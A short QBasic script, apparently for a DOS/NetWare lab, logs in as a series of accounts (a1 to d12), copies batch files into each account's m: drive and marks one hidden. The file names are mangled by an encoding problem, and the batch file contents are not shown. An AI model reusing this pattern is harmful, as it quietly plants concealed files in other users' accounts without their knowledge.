SHELL "f:login a8"
SHELL "copy/y c:\���\bbs1.bat m:\���.bat"
SHELL "copy/y c:\���\bbs.bat m:\"
SHELL "attrib m:\���.bat +h"
FOR i = 97 TO 100
FOR j = 1 TO 12
IF j <= 9 THEN m = 1 ELSE m = 2
IF i = 97 AND j = 8 THEN j = 9
SHELL "f:login.exe " + CHR$(i) + RIGHT$(STR$(j), m)
SHELL "copy/y c:\���\bbs.bat m:\"
SHELL "copy/y c:\���\���.bat m:\"
SHELL "c:\dos\attrib m:\���.bat +h"
'SHELL "edit m:\bbs.bat"
NEXT j, i
SYSTEM

